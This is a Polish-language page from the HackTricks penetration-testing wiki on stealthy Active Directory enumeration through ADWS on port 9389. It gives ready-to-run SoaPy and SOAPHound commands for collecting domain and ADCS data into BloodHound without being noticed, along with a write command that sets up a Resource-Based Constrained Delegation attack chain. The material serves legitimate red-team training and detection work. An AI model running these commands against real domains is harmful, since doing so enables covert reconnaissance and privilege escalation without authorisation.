# Active Directory Web Services (ADWS) Enumeracja i ukryte zbieranie

{{#include ../../banners/hacktricks-training.md}}

## Czym jest ADWS?

Active Directory Web Services (ADWS) jest **włączony domyślnie na każdym Domain Controller od Windows Server 2008 R2** i nasłuchuje na TCP **9389**. Pomimo nazwy, **nie ma tu HTTP**. Zamiast tego usługa udostępnia dane w stylu LDAP przez stos własnościowych .NET framing protocols:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Ponieważ ruch jest enkapsulowany w tych binarnych ramach SOAP i przebiega przez nietypowy port, **enumeration przez ADWS jest zdecydowanie mniej prawdopodobne, że będzie inspekcjonowane, filtrowane lub sygnaturowane niż klasyczny ruch LDAP/389 & 636**. Dla operatorów oznacza to:

* Bardziej skryte rozpoznanie – Blue teams często koncentrują się na zapytaniach LDAP.
* Możliwość zbierania z **non-Windows hosts (Linux, macOS)** przez tunelowanie 9389/TCP przez SOCKS proxy.
* Te same dane, które uzyskałbyś przez LDAP (użytkownicy, grupy, ACLs, schema itp.) oraz możliwość wykonywania **zapisów** (np. `msDs-AllowedToActOnBehalfOfOtherIdentity` dla **RBCD**).

Interakcje ADWS są realizowane przez WS-Enumeration: każde zapytanie zaczyna się od wiadomości `Enumerate`, która definiuje filtr/atrybuty LDAP i zwraca `EnumerationContext` GUID, a następnie jedno lub więcej wiadomości `Pull`, które streamują wyniki do okna zdefiniowanego przez serwer. Contexty wygasają po ~30 minutach, więc narzędzia muszą albo stronicować wyniki, albo dzielić filtry (zapytania prefiksowe per CN), aby nie utracić stanu. Gdy prosisz o security descriptors, określ kontrolę `LDAP_SERVER_SD_FLAGS_OID`, aby pominąć SACLs, w przeciwnym razie ADWS po prostu usuwa atrybut `nTSecurityDescriptor` z odpowiedzi SOAP.

> NOTE: ADWS jest również używany przez wiele narzędzi RSAT GUI/PowerShell, więc ruch może się mieszać z legalną aktywnością administratorów.

## SoaPy – natywny klient Python

[SoaPy](https://github.com/logangoins/soapy) jest **pełną re-implementacją stosu protokołów ADWS w czystym Pythonie**. Tworzy ramki NBFX/NBFSE/NNS/NMF bajt po bajcie, pozwalając na zbieranie z systemów Unix-like bez dotykania runtime .NET.

### Kluczowe cechy

* Obsługuje **proxying through SOCKS** (przydatne z C2 implants).
* Drobnoziarniste filtry wyszukiwania identyczne jak LDAP `-q '(objectClass=user)'`.
* Opcjonalne operacje **zapisów** ( `--set` / `--delete` ).
* **BOFHound output mode** do bezpośredniego zaimportowania do BloodHound.
* Flaga `--parse` do upiększania timestampów / `userAccountControl` gdy wymagana jest czytelność dla człowieka.

### Flagi zbierania ukierunkowanego i operacje zapisu

SoaPy dostarcza zestaw starannie dobranych przełączników, które odtwarzają najczęstsze zadania łowieckie LDAP przez ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus surowe pokrętła `--query` / `--filter` do niestandardowych pobrań. Połącz je z prymitywami zapisu takimi jak `--rbcd <source>` (ustawia `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging dla ukierunkowanego Kerberoasting) oraz `--asrep` (odwrócenie `DONT_REQ_PREAUTH` w `userAccountControl`).

Przykład ukierunkowanego wyszukiwania SPN, które zwraca tylko `samAccountName` i `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Użyj tego samego hosta/poświadczeń, aby natychmiast wykorzystać ustalenia: zrzutuj obiekty obsługujące RBCD za pomocą `--rbcds`, a następnie zastosuj `--rbcd 'WEBSRV01$' --account 'FILE01$'`, aby ustawić łańcuch Resource-Based Constrained Delegation (zobacz [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) dla pełnej ścieżki nadużycia).

### Instalacja (host operatora)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Sopa - Praktyczny klient ADWS w Golangu

Podobnie jak soapy, [sopa](https://github.com/Macmod/sopa) implementuje stos protokołów ADWS (MS-NNS + MC-NMF + SOAP) w Golangu, wystawiając flagi w wierszu poleceń do wykonywania wywołań ADWS, takich jak:

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* and others such as `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – Zbieranie ADWS o dużej objętości (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) to kolektor .NET, który utrzymuje wszystkie interakcje LDAP wewnątrz ADWS i generuje JSON kompatybilny z BloodHound v4. Tworzy jednorazowo pełny cache `objectSid`, `objectGUID`, `distinguishedName` oraz `objectClass` (`--buildcache`), a następnie ponownie go wykorzystuje do wysokoprzepustowych przejść `--bhdump`, `--certdump` (ADCS) lub `--dnsdump` (AD-integrated DNS), dzięki czemu tylko ~35 krytycznych atrybutów opuszcza DC. AutoSplit (`--autosplit --threshold <N>`) automatycznie dzieli zapytania według prefiksu CN, aby utrzymać się poniżej 30-minutowego limitu EnumerationContext w dużych lasach.

Typowy przebieg pracy na VM operatora dołączonego do domeny:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Wyeksportowane pliki JSON można bezpośrednio załadować do workflow SharpHound/BloodHound — zobacz [BloodHound methodology](bloodhound.md) w celu pomysłów na dalsze wizualizacje grafów. AutoSplit sprawia, że SOAPHound jest odporny w środowiskach z wielomilionową liczbą obiektów, jednocześnie utrzymując liczbę zapytań niższą niż przy snapshotach w stylu ADExplorer.

## Stealth AD Collection Workflow

Poniższy workflow pokazuje, jak enumerować **domain & ADCS objects** przez ADWS, konwertować je do BloodHound JSON i wyszukiwać ścieżki ataku oparte na certyfikatach — wszystko z poziomu Linux:

1. **Tunnel 9389/TCP** z docelowej sieci do twojej maszyny (np. via Chisel, Meterpreter, SSH dynamic port-forward, itd.). Wyeksportuj `export HTTPS_PROXY=socks5://127.0.0.1:1080` lub użyj opcji SoaPy `--proxyHost/--proxyPort`.

2. **Zbierz główny obiekt domeny:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Zbierz obiekty powiązane z ADCS z Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konwertuj do BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Prześlij plik ZIP** w BloodHound GUI i uruchom zapytania cypher takie jak `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` aby ujawnić ścieżki eskalacji certyfikatów (ESC1, ESC8, itd.).

### Zapisywanie `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Połącz to z `s4u2proxy`/`Rubeus /getticket` dla pełnego łańcucha Resource-Based Constrained Delegation (zob. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Podsumowanie narzędzi

| Cel | Narzędzie | Uwagi |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, odczyt/zapis |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, tryby BH/ADCS/DNS |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Konwertuje logi SoaPy/ldapsearch |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Może być przekierowane przez ten sam SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Ogólny klient do interakcji ze znanymi punktami końcowymi ADWS — umożliwia enumerację, tworzenie obiektów, modyfikację atrybutów i zmiany haseł |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
